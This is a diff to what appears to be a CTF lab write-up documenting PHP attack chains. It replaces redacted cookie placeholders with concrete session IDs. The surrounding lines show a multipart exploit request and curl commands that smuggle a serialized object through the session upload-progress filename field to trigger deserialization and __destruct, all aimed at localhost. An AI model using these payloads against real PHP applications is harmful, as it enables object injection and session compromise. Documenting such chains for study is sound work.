@@ -45,7 +45,7 @@ This document describes the **five attack chains** (A, B, C, D, E) documented in
 POST /index.php HTTP/1.1
 Host: 127.0.0.1:18080
 Content-Type: multipart/form-data; boundary=EXPLOIT
-Cookie: ***
+Cookie: PHPSESSID=ctfchainA000000000000000000
 
 --EXPLOIT
 Content-Disposition: form-data; name="PHPSESSID"
@@ -124,14 +124,14 @@ USE_ZEND_ALLOC=0 ASAN_OPTIONS="detect_leaks=0" php verify_uaf_asan.php
 ```bash
 # Write (php_serialize)
 curl -X POST \
-  -H "Cookie: ***" \
+  -H "Cookie: PHPSESSID=chainC00000000000000000000" \
   -F "PHPSESSID=chainC00000000000000000000" \
   -F "PHP_SESSION_UPLOAD_PROGRESS=x" \
   -F 'f=@-;filename="x|O:8:\"stdClass\":0:{}"' \
   http://127.0.0.1:18080/app/upload.php <<< "dummy"
 
 # Read (the php handler deserializes and triggers __destruct)
-curl -H "Cookie: ***" \
+curl -H "Cookie: PHPSESSID=chainC00000000000000000000" \
   http://127.0.0.1:18080/api/endpoint.php
 ```
 
